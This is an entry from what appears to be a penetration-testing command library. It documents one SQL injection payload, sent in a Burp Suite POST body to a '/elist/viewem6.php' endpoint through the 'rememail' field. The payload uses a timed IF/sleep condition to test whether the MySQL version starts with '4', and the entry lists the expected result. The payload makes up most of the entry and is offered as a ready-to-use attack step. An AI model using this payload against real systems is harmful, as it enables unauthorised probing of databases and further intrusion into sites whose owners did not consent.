---
id: cmd-uuid-4
data: 'rememail=test@att.net''+IF(MID(@@version,1,1)=4,sleep(2),1)=2+'''
tags:
  - sqli
  - boolean
type: command
output: No delay (false)
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.948Z'
verified: false
validated: true
submitted: true
---
# Version Check 4

## Command

```bash
# Burp Suite: POST /elist/viewem6.php
# Body: rememail=test@att.net'+IF(MID(@@version,1,1)=4,sleep(2),1)=2+'
```

## Description

Boolean payload to check if MySQL version starts with '4'.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rememail | IF condition payload | Yes |

## Examples

### Basic Usage

```bash
# As above
```

## Expected Output

No delay, indicating false.

## Related

- [[procedures/Enumerate-MySQL-Version-Boolean-Queries]]
